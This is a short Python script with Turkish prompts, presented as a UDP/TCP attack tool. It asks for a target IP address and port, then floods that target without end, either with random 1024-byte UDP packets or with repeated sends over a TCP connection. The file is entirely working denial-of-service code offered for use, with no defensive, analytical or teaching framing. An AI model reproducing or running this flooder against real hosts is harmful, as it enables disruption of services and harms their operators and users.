import socket,random

print("""\033[1;32;40m 
ege mizah udp attack toolu
1 => UDP DoS
2 => TCP DoS 

1s.1v""")
ip = input("ip Adresi giriniz: ")
port = int(input("port Numarasını giriniz: "))
secim = int(input("seçimi giriniz!!: "))
t = 100
def at():
    s = socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
    while True:
        data = random._urandom(1024)
        adr = str(ip),int(port)
        for z in range(t):
            s.sendto(data,adr)
            print("\033[1;32;40m ~~> Paket gitti  ") 
                        

def att():
    sa = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    sa.connect((ip,port))
    while True:
        for w in range(t):
            sa.send(b'1024')
            print("\033[1;32;40m [+] PAKET GİTTİ !!")
            

    
    
    
    
if secim == 1:
    at()
if secim == 2:
    att()

else:
    print("Doğru seçim giriniz!!")
